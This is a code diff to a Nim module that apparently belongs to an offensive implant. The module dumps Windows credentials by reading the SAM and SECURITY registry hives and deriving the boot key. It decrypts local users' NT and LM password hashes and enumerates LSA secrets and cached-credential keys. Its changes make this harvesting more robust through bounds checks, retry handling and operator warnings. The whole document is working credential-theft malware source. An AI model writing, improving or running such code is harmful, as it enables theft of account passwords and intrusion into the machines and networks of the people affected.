@@ -45,8 +45,11 @@ proc requireRange(data: seq[byte], start, endExclusive: int, context: string) =
   if start < 0 or endExclusive < start or endExclusive > data.len:
     samHarvestError("hashdump harvest failed: " & context & " (len=" & $data.len & ")")
 
-proc requireSamVRange(v: seq[byte], start, endExclusive: int, context: string) =
-  requireRange(v, start, endExclusive, context)
+proc registryNameMaxBytes(container: seq[byte], nameField: pointer): int =
+  let nameOffset = cast[int](nameField) - cast[int](addr container[0])
+  if nameOffset < 0 or nameOffset >= container.len:
+    return 0
+  container.len - nameOffset
 
 proc OpenRegistryWithNtOpenKeyEx(keyString: PCWSTR): HANDLE =
   var
@@ -93,7 +96,6 @@ proc EnumerateValueNames(hKey:HANDLE): tuple[names: seq[string], warning: string
 
     if status != 0:
       debug "[-] hashdump: cache value enumerate failed, ntstatus: ", $status
-      inc index
       inc consecutiveFailures
       if consecutiveFailures >= MaxEnumerateFailures:
         warning = "Security harvest failed: cache enumeration truncated"
@@ -104,7 +106,7 @@ proc EnumerateValueNames(hKey:HANDLE): tuple[names: seq[string], warning: string
     consecutiveFailures = 0
     info = cast[ptr KEY_VALUE_BASIC_INFORMATION_STRUCT](addr buffer[0])
     let pName = cast[ptr UncheckedArray[WCHAR]](addr info.Name)
-    name = wcharsToString(pName, info.NameLength)
+    name = wcharsToString(pName, info.NameLength, registryNameMaxBytes(buffer, cast[pointer](addr info.Name)))
 
     if(cmpIgnoreCase(name,"NL$Control") != 0):
       returnValue.add(name)
@@ -246,6 +248,8 @@ proc GetBootKey(): seq[byte] =
       samHarvestError("hashdump harvest failed: empty boot key class")
     for i in 0 ..< classSize.int:
       classStr.add(cast[char](classBuffer[i]))
+  if classStr.len != 32:
+    samHarvestError("hashdump harvest failed: boot key class hex length invalid")
   scrambledByteArray = hexStringToByteArray(classStr)
   if scrambledByteArray.len < 16:
     samHarvestError("hashdump harvest failed: boot key hex too short")
@@ -323,7 +327,7 @@ proc DumpSecret(keyLocation:string,decryptedLsaKey:seq[byte]):seq[byte] =
     return returnValue
 
 proc GetServiceUsername(targetService: string): string =
-  let scMgrHandle = OpenSCManager(NULL, NULL, 0xF003F)
+  let scMgrHandle = OpenSCManager(NULL, NULL, 0x0001)
   if scMgrHandle == 0:
     return obf("unknownUser")
   defer:
@@ -421,15 +425,16 @@ proc collectSecurityDumpImpl(harvest: var HashdumpResult): string =
           break
         if status != 0:
           debug "[-] hashdump: NL$KM enumerate failed, ntstatus: ", $status
-          inc index
           inc consecutiveFailures
           if consecutiveFailures >= MaxEnumerateFailures:
+            if enumWarning.len == 0:
+              enumWarning = "Security harvest failed: NL$KM enumeration truncated"
             break
           continue
         consecutiveFailures = 0
         let pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
         let pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
-        let name = wcharsToString(pName, pInfo.NameLength)
+        let name = wcharsToString(pName, pInfo.NameLength, registryNameMaxBytes(buf, cast[pointer](addr pInfo.Name)))
         if(name.contains("CurrVal")):
           currValName = name
           break
@@ -495,15 +500,16 @@ proc collectSecurityDumpImpl(harvest: var HashdumpResult): string =
           break
         if status != 0:
           debug "[-] hashdump: secrets enumerate failed, ntstatus: ", $status
-          inc index
           inc consecutiveFailures
           if consecutiveFailures >= MaxEnumerateFailures:
+            if enumWarning.len == 0:
+              enumWarning = "Security harvest failed: LSA secrets enumeration truncated"
             break
           continue
         consecutiveFailures = 0
         let pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
         let pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
-        let name = wcharsToString(pName, pInfo.NameLength)
+        let name = wcharsToString(pName, pInfo.NameLength, registryNameMaxBytes(buf, cast[pointer](addr pInfo.Name)))
         if(cmpIgnoreCase(name,"NL$Control") != 0):
           listOfLSASecrets.add(name)
         inc index
@@ -529,9 +535,9 @@ proc collectSecurityDump(harvest: var HashdumpResult): PhaseResult =
     return phase
   except HashdumpHarvestError as e:
     debug "[-] hashdump: ", e.debugDetail
-    var warning = "Security harvest failed"
-    if e.debugDetail.contains("NL$KM"):
-      warning = "Security harvest failed: unable to read NL$KM"
+    var warning = e.operatorMessage
+    if warning.len == 0:
+      warning = "Security harvest failed"
     return PhaseResult(
       dataProduced: securityDataProduced(harvest),
       failed: true,
@@ -539,8 +545,9 @@ proc collectSecurityDump(harvest: var HashdumpResult): PhaseResult =
       warning: warning
     )
 
-proc collectSamDumpImpl(harvest: var HashdumpResult) =
+proc collectSamDumpImpl(harvest: var HashdumpResult): string =
   var listOfUserKeys:seq[string] = @[]
+  var samWarning = ""
   block:
     let usersHandle = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users"))
     defer:
@@ -564,159 +571,190 @@ proc collectSamDumpImpl(harvest: var HashdumpResult) =
         break
       if status != 0:
         debug "[-] hashdump: SAM user enumerate failed, ntstatus: ", $status
-        inc index
         inc consecutiveFailures
         if consecutiveFailures >= MaxEnumerateFailures:
+          samWarning = "SAM harvest failed: user enumeration truncated"
           break
         continue
       consecutiveFailures = 0
       let pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
       let pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
-      let name = wcharsToString(pName, pInfo.NameLength)
+      let name = wcharsToString(pName, pInfo.NameLength, registryNameMaxBytes(buf, cast[pointer](addr pInfo.Name)))
       if(name.startsWith("00000")):
         listOfUserKeys.add(name)
       inc index
+
+    if index >= MaxEnumerateIndex and samWarning.len == 0:
+      samWarning = "SAM harvest failed: user enumeration truncated at index cap"
 
   let hashedBootKey = GetHashedBootKey(GetSysKey(), GetBootKey())
   let antpassword:seq[byte] = cast[seq[byte]]("NTPASSWORD\0")
   let almpassword:seq[byte] = cast[seq[byte]]("LMPASSWORD\0")
 
   for userKey in listOfUserKeys:
-    var userRIDByteArray:array[4,byte]
-    let userRIDUint = parseHexInt(userKey).uint32
-    copyMem(addr userRIDByteArray[0],cast[ptr byte](addr userRIDUint),4)
+    try:
+      var userRIDByteArray:array[4,byte]
+      let userRIDUint = try:
+        parseHexInt(userKey).uint32
+      except ValueError:
+        debug "[-] hashdump: skipping invalid SAM user RID key: ", userKey
+        continue
+      copyMem(addr userRIDByteArray[0],cast[ptr byte](addr userRIDUint),4)
 
-    var vValueUser: seq[byte]
-    block:
-      let userHandle = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\") & userKey)
-      defer:
-        discard NtCloseProc(userHandle)
-      vValueUser = GetValueWithRegQueryMultipleValuesWType(userHandle, obf("V"))
+      var vValueUser: seq[byte]
+      block:
+        let userHandle = OpenRegistryWithNtOpenKeyEx(obf("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\") & userKey)
+        defer:
+          discard NtCloseProc(userHandle)
+        vValueUser = GetValueWithRegQueryMultipleValuesWType(userHandle, obf("V"))
 
-    let (offset, length, lmHashOffset, lmHashLength, ntHashOffset, ntHashLength) = parseSamVFields(vValueUser)
-    var usernameWstring = newWString(0)
-    var idx = 0
-    while idx < length:
-      usernameWstring.add(cast[WCHAR](vValueUser[idx+offset]))
-      idx = idx + 2
+      let (offset, length, lmHashOffset, lmHashLength, ntHashOffset, ntHashLength) = parseSamVFields(vValueUser)
+      var usernameWstring = newWString(0)
+      var idx = 0
+      while idx < length:
+        usernameWstring.add(cast[WCHAR](vValueUser[idx+offset]))
+        idx = idx + 2
 
-    var decryptStatus = "not_applicable"
-    var lmHashNode = newJNull()
-    var ntHashNode = newJNull()
-    var lmOk = false
-    var ntOk = false
-    var attemptedDecrypt = false
+      var decryptStatus = "not_applicable"
+      var lmHashNode = newJNull()
+      var ntHashNode = newJNull()
+      var lmOk = false
+      var ntOk = false
+      var attemptedDecrypt = false
 
-    if vValueUser[ntHashOffset + 2] == 0x01:
-      var md5ContextVar:MD5Context
-      var md5DigestVar:MD5Digest
-      if ntHashLength == 20:
-        attemptedDecrypt = true
-        requireSamVRange(vValueUser, ntHashOffset + 4, ntHashOffset + 20, "SAM V NT hash out of range")
-        var ntKeyParts = newSeq[byte](0)
-        var ntHashDecryptionKey = newSeq[byte](16)
-        ntKeyParts.add(hashedBootKey[0..<16])
-        ntKeyParts.add(userRIDByteArray)
-        ntKeyParts.add(antpassword)
-        md5ContextVar.md5Init()
-        md5ContextVar.md5Update(ntKeyParts)
-        md5ContextVar.md5Final(md5DigestVar)
-        copyMem(addr ntHashDecryptionKey[0],addr md5DigestVar[0],16)
-        let encryptedNtHash = vValueUser[ntHashOffset + 4 ..< ntHashOffset + 20]
-        let obfuscatedNtHash = RC4Encrypt(ntHashDecryptionKey, encryptedNtHash)
-        try:
-          let ntHash = DecryptSingleHash(obfuscatedNtHash, userKey).replace("-", "").toLower()
-          ntHashNode = %ntHash
-          ntOk = true
-        except CatchableError:
-          discard
-      if lmHashLength == 20:
-        attemptedDecrypt = true
-        requireSamVRange(vValueUser, lmHashOffset + 4, lmHashOffset + 20, "SAM V LM hash out of range")
-        var lmKeyParts = newSeq[byte](0)
-        var lmHashDecryptionKey = newSeq[byte](16)
-        lmKeyParts.add(hashedBootKey[0..<16])
-        lmKeyParts.add(userRIDByteArray)
-        lmKeyParts.add(almpassword)
-        md5ContextVar.md5Init()
-        md5ContextVar.md5Update(lmKeyParts)
-        md5ContextVar.md5Final(md5DigestVar)
-        copyMem(addr lmHashDecryptionKey[0],addr md5DigestVar[0],16)
-        let encryptedLmHash = vValueUser[lmHashOffset + 4 ..< lmHashOffset + 20]
-        let obfuscatedLmHash = RC4Encrypt(lmHashDecryptionKey, encryptedLmHash)
-        try:
-          let lmHash = DecryptSingleHash(obfuscatedLmHash, userKey).replace("-", "").toLower()
-          lmHashNode = %lmHash
-          lmOk = true
-        except CatchableError:
-          discard
-      if attemptedDecrypt:
-        if lmOk or ntOk:
-          decryptStatus = "ok"
-        else:
-          decryptStatus = "failed"
-    else:
-      requireSamVRange(vValueUser, lmHashOffset, lmHashOffset + lmHashLength, "SAM V LM blob out of range")
-      let enc_LM_Hash = vValueUser[lmHashOffset ..< lmHashOffset + lmHashLength]
-      if enc_LM_Hash.len >= 24:
-        let lmData = enc_LM_Hash[24 ..< enc_LM_Hash.len]
-        if lmData.len > 0:
+      if vValueUser[ntHashOffset + 2] == 0x01:
+        var md5ContextVar:MD5Context
+        var md5DigestVar:MD5Digest
+        if ntHashLength == 20:
           attemptedDecrypt = true
-          let slice = hashedBootKey[0 ..< 16]
-          let lmHashSalt = enc_LM_Hash[8 ..< 24]
-          let desEncryptedHash = DecryptAES_CBC(lmData, slice, lmHashSalt)
-          if desEncryptedHash.len > 0:
-            try:
-              let lmHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "").toLower()
-              lmHashNode = %lmHash
-              lmOk = true
-            except CatchableError:
-              discard
-      requireSamVRange(vValueUser, ntHashOffset, ntHashOffset + ntHashLength, "SAM V NT blob out of range")
-      let enc_NT_Hash = vValueUser[ntHashOffset ..< ntHashOffset + ntHashLength]
-      if enc_NT_Hash.len >= 24:
-        let ntData = enc_NT_Hash[24 ..< enc_NT_Hash.len]
-        if ntData.len > 0:
+          requireRange(vValueUser, ntHashOffset + 4, ntHashOffset + 20, "SAM V NT hash out of range")
+          var ntKeyParts = newSeq[byte](0)
+          var ntHashDecryptionKey = newSeq[byte](16)
+          ntKeyParts.add(hashedBootKey[0..<16])
+          ntKeyParts.add(userRIDByteArray)
+          ntKeyParts.add(antpassword)
+          md5ContextVar.md5Init()
+          md5ContextVar.md5Update(ntKeyParts)
+          md5ContextVar.md5Final(md5DigestVar)
+          copyMem(addr ntHashDecryptionKey[0],addr md5DigestVar[0],16)
+          let encryptedNtHash = vValueUser[ntHashOffset + 4 ..< ntHashOffset + 20]
+          let obfuscatedNtHash = RC4Encrypt(ntHashDecryptionKey, encryptedNtHash)
+          try:
+            let ntHash = DecryptSingleHash(obfuscatedNtHash, userKey).replace("-", "").toLower()
+            ntHashNode = %ntHash
+            ntOk = true
+          except CatchableError as e:
+            debug "[-] hashdump: NT hash decrypt failed for ", userKey, ": ", e.msg
+            discard
+        if lmHashLength == 20:
           attemptedDecrypt = true
-          let slice = hashedBootKey[0 ..< 16]
-          let ntHashSalt = enc_NT_Hash[8 ..< 24]
-          let desEncryptedHash = DecryptAES_CBC(ntData, slice, ntHashSalt)
-          if desEncryptedHash.len > 0:
-            try:
-              let ntHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "").toLower()
-              ntHashNode = %ntHash
-              ntOk = true
-            except CatchableError:
-              discard
-      if attemptedDecrypt:
-        if lmOk or ntOk:
-          decryptStatus = "ok"
-        else:
-          decryptStatus = "failed"
+          requireRange(vValueUser, lmHashOffset + 4, lmHashOffset + 20, "SAM V LM hash out of range")
+          var lmKeyParts = newSeq[byte](0)
+          var lmHashDecryptionKey = newSeq[byte](16)
+          lmKeyParts.add(hashedBootKey[0..<16])
+          lmKeyParts.add(userRIDByteArray)
+          lmKeyParts.add(almpassword)
+          md5ContextVar.md5Init()
+          md5ContextVar.md5Update(lmKeyParts)
+          md5ContextVar.md5Final(md5DigestVar)
+          copyMem(addr lmHashDecryptionKey[0],addr md5DigestVar[0],16)
+          let encryptedLmHash = vValueUser[lmHashOffset + 4 ..< lmHashOffset + 20]
+          let obfuscatedLmHash = RC4Encrypt(lmHashDecryptionKey, encryptedLmHash)
+          try:
+            let lmHash = DecryptSingleHash(obfuscatedLmHash, userKey).replace("-", "").toLower()
+            lmHashNode = %lmHash
+            lmOk = true
+          except CatchableError as e:
+            debug "[-] hashdump: LM hash decrypt failed for ", userKey, ": ", e.msg
+            discard
+        if attemptedDecrypt:
+          if lmOk or ntOk:
+            decryptStatus = "ok"
+          else:
+            decryptStatus = "failed"
+      else:
+        requireRange(vValueUser, lmHashOffset, lmHashOffset + lmHashLength, "SAM V LM blob out of range")
+        let enc_LM_Hash = vValueUser[lmHashOffset ..< lmHashOffset + lmHashLength]
+        if enc_LM_Hash.len >= 24:
+          let lmData = enc_LM_Hash[24 ..< enc_LM_Hash.len]
+          if lmData.len > 0:
+            attemptedDecrypt = true
+            let slice = hashedBootKey[0 ..< 16]
+            let lmHashSalt = enc_LM_Hash[8 ..< 24]
+            let desEncryptedHash = DecryptAES_CBC(lmData, slice, lmHashSalt)
+            if desEncryptedHash.len > 0:
+              try:
+                let lmHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "").toLower()
+                lmHashNode = %lmHash
+                lmOk = true
+              except CatchableError as e:
+                debug "[-] hashdump: LM AES hash decrypt failed for ", userKey, ": ", e.msg
+                discard
+        requireRange(vValueUser, ntHashOffset, ntHashOffset + ntHashLength, "SAM V NT blob out of range")
+        let enc_NT_Hash = vValueUser[ntHashOffset ..< ntHashOffset + ntHashLength]
+        if enc_NT_Hash.len >= 24:
+          let ntData = enc_NT_Hash[24 ..< enc_NT_Hash.len]
+          if ntData.len > 0:
+            attemptedDecrypt = true
+            let slice = hashedBootKey[0 ..< 16]
+            let ntHashSalt = enc_NT_Hash[8 ..< 24]
+            let desEncryptedHash = DecryptAES_CBC(ntData, slice, ntHashSalt)
+            if desEncryptedHash.len > 0:
+              try:
+                let ntHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "").toLower()
+                ntHashNode = %ntHash
+                ntOk = true
+              except CatchableError as e:
+                debug "[-] hashdump: NT AES hash decrypt failed for ", userKey, ": ", e.msg
+                discard
+        if attemptedDecrypt:
+          if lmOk or ntOk:
+            decryptStatus = "ok"
+          else:
+            decryptStatus = "failed"
 
-    let ridStr = $userRIDUint
-    var userObj = %*{
-      "rid": ridStr,
-      "username": $usernameWstring,
-      "decrypt_status": decryptStatus,
-      "lm_hash": lmHashNode,
-      "nt_hash": ntHashNode,
-    }
-    if lmOk and ntOk:
-      userObj["ntlm"] = %($lmHashNode.getStr & ":" & ntHashNode.getStr)
-    harvest.local_users.add(userObj)
+      let ridStr = $userRIDUint
+      var userObj = %*{
+        "rid": ridStr,
+        "username": $usernameWstring,
+        "decrypt_status": decryptStatus,
+        "lm_hash": lmHashNode,
+        "nt_hash": ntHashNode,
+      }
+      if lmOk and ntOk:
+        userObj["ntlm"] = %($lmHashNode.getStr & ":" & ntHashNode.getStr)
+      harvest.local_users.add(userObj)
+    except HashdumpHarvestError as e:
+      debug "[-] hashdump: skipping user ", userKey, ": ", e.debugDetail
+      harvest.local_users.add(%*{
+        "rid": userKey,
+        "username": "",
+        "decrypt_status": "failed",
+        "lm_hash": newJNull(),
+        "nt_hash": newJNull(),
+      })
+    except CatchableError as e:
+      debug "[-] hashdump: skipping user ", userKey, ": ", e.msg
+
+  return samWarning
 
 proc collectSamDump(harvest: var HashdumpResult): PhaseResult =
   try:
-    collectSamDumpImpl(harvest)
-    return PhaseResult(dataProduced: samDataProduced(harvest), failed: false)
+    let implWarning = collectSamDumpImpl(harvest)
+    var phase = PhaseResult(dataProduced: samDataProduced(harvest), failed: false)
+    if implWarning.len > 0:
+      phase.warning = implWarning
+    return phase
   except HashdumpHarvestError as e:
     debug "[-] hashdump: ", e.debugDetail
+    var warning = e.operatorMessage
+    if warning.len == 0:
+      warning = "SAM harvest failed"
     return PhaseResult(
       dataProduced: samDataProduced(harvest),
       failed: true,
       operatorMessage: e.operatorMessage,
-      warning: "SAM harvest failed"
+      warning: warning
     )
 
 proc collectHashdumpData*(): JsonNode =
